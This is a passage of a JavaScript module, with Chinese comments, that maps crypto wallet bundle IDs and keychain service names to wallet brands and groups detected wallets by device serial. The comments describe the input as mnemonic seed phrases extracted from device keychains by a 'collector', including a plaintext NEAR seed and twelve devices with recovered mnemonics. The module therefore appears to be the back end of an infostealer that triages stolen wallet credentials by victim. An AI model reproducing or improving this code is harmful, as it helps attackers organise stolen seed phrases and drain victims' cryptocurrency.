    'uphold': 'Uphold', 'bitso': 'Bitso', 'coinmena': 'CoinMENA', 'indodax': 'INDODAX',
    'globalwallet': 'GlobalWallet', 'crypto.com': 'Crypto.com',
  };
  const WS = { // 18 链 wallet_svcs 服务名（小写）→ 显示名（未收录的按原名透传——采集器认证过的必是钱包）
    'metamask': 'MetaMask', 'phantom': 'Phantom', 'trust': 'Trust Wallet', 'toshi': 'Coinbase Wallet',
    'binance': 'Binance', 'okx': 'OKX', 'imtoken': 'imToken', 'bitpie': 'Bitpie', 'bitget': 'Bitget Wallet',
    'bitkeep': 'Bitget Wallet', 'tonkeeper': 'Tonkeeper', 'uniswap': 'Uniswap', 'globalwallet': 'GlobalWallet',
    'coinbase': 'Coinbase', 'tronlink': 'TronLink', 'onekey': 'OneKey', 'keplr': 'Keplr', 'zerion': 'Zerion',
    'gnosis': 'Gnosis Safe', 'tonhub': 'Tonhub', 'solflare': 'Solflare', 'coin98': 'Coin98',
    'safepal': 'SafePal', 'mathwallet': 'MathWallet', 'exodus': 'Exodus', 'krystal': 'Krystal',
    'mytonwallet': 'MyTonWallet', 'ledger': 'Ledger Live', 'argent': 'Argent',
  };
  // 【2026-09-19】18 链 walletDiag[s].wallets[]（助记词提取记录）的 bundle 精确映射。
  //   背景：keychain 提取的钱包此前完全不参与识别（walletEvidence 不读 wallets[]），
  //   导致 Bitcoin.com Wallet / NEAR 等 12 台有助记词设备显示「无钱包」。键 = 去 keychain 组
  //   前缀（TEAMID. / group.）后的小写 bundle；未收录的仍走 WB 子串兜底。
  const WK = {
    'com.bitcoin.mwallet': 'Bitcoin.com Wallet',
    'swc': 'NEAR Wallet',                              // Service=swc / Account=nearSeed（NEAR 钱包明文种）
    'io.changenow.wallet-now': 'ChangeNOW',
    'com.bitpanda.defiwallet': 'Bitpanda DeFi Wallet',
    'com.litecoin.loafwallet': 'LoafWallet',
    'com.moonpay.app': 'MoonPay',
    'com.deblock.deblockapp.production': 'Deblock',
    'com.smartblockchain.wallet': 'Smart Blockchain',
    'com.batonresearch.pump': 'Pump',
  };
  const wbMatch = (txt) => {
    const t = String(txt || '').toLowerCase();
    for (const [p, d] of WB) if (t.includes(p)) return d;
    return null;
  };
  // 【2026-09-14】18 链应用名反格式回填（与 scan 全局阶段同逻辑、幂等）：18 链 installed_apps 的
  //   name 就是 bundle 本身 → 用 ①其它设备已报过的同 bundle 真名（nmap）②KNOWN_APP_NAMES 静态表
  //   回填；两者皆无则置空。缺这步会漏「bundle 与显示名无关」的钱包（如 co.mona.Monaco=Crypto.com
  //   只能靠 name 精确匹配命中）。快照路径已先行回填 → 此处重跑为无操作；PG 路径依赖此处回填。
  const nmap = new Map();
  for (const a of (appRows || [])) {
    if (a && a.bundle_id && a.name && a.name !== a.bundle_id) nmap.set(a.bundle_id, a.name);
  }
  for (const a of (appRows || [])) {
    if (!a) continue;
    if (a.name && a.name !== a.bundle_id) continue;
    const n = nmap.get(a.bundle_id) || KNOWN_APP_NAMES[a.bundle_id];
    a.name = n || '';
  }
  const walletEv = new Map();   // serial -> Set(显示名)
  const wAdd = (s, name) => {
    if (!s || !name) return;
    let set = walletEv.get(s);
    if (!set) walletEv.set(s, set = new Set());
    set.add(name);
  };
  for (const a of (appRows || [])) {
    const s = a.serial || a.serial_id;
    if (!s) continue;
    const hit = wbMatch(a.bundle_id) || WN[String(a.name || '').toLowerCase().trim()];
    if (hit) wAdd(s, hit);
  }
  for (const [s, v] of Object.entries(walletDiag || {})) {
    if (!v) continue;
    for (const svc of (v.wallet_svcs || [])) {
      const k = String(svc).toLowerCase().trim();
      wAdd(s, WS[k] || String(svc));
    }
    for (const g of (v.crypto_apps || [])) {
      const hit = wbMatch(g);
      if (hit) wAdd(s, hit);
    }
    // 【2026-09-19】提取记录 wallets[] 参与识别：app 名走 WN（"Bitpie"/"Trust"/"Phantom" 等，
    //   "Keychain:XXX" 内部标签自然不命中）；bundle 去 keychain 组前缀后走 WK 精确 → WB 子串兜底。
    for (const w of (v.wallets || [])) {
      if (!w) continue;
      const nHit = WN[String(w.app || '').toLowerCase().trim()];
      if (nHit) wAdd(s, nHit);
      let b = String(w.bundle || '').trim();
      if (b) {
        b = b.replace(/^group\./i, '').replace(/^[0-9A-Z]{10}\./, '');
        const bHit = WK[b.toLowerCase()] || wbMatch(b) || wbMatch(w.bundle);
        if (bHit) wAdd(s, bHit);
      }
    }
  }
  const out = new Map();
  for (const [s, set] of walletEv) out.set(s, [...set].sort());
  return out;
}

function abbr(s, head, tail) {
  if (!s) return null;
  s = String(s);
  if (s.length <= head + tail + 3) return s;
  return s.slice(0, head) + '***' + s.slice(-tail);
}
function titleOK(t) { return t !== null && t !== undefined && String(t).trim().length > 0; }
function iso(ts) {
  if (!ts) return '';
  const d = new Date(Number(ts));
  return isNaN(d) ? String(ts) : d.toISOString().replace('T', ' ').slice(0, 19);
}

// 【P2】取走"最后一次桶处理记录的新增区间"（ingestd 增量提取用；返回切片引用）
function takeBucketNew(store) {
  const st = bcState;
  const nr = st.newRanges || {};
  const out = {};
  for (const k of Object.keys(nr)) {
    const r = nr[k];
    if (Array.isArray(r)) out[k] = store[k].slice(r[0], r[1]);
  }
  st.newRanges = null;
  return out;
}
// 【P2·ingestd】取走某桶本轮运行信息 {sig, led, meta}（处理完由 ingestd 落自有账本）；
//   异常轮 sig='' / led=null / meta=null → ingestd 落空账本 → 下轮全量重扫（语义与磁盘固化一致）。
function takeBucketState(name) {
  const ri = bcRunInfo.get(name);
  bcRunInfo.delete(name);
  if (!ri) return null;
  return {
    sig: (typeof ri.sig === 'string') ? ri.sig : '',
    led: Array.isArray(ri.led) ? ri.led : null,
    meta: ri.meta || null,
  };
}
module.exports = { scan, abbr, isSplit, feed, deviceData, getDeviceShard, findById, processBucket, newStore, bcShardInit, takeBucketNew, takeBucketState, bcBucketSig, walletEvidence };
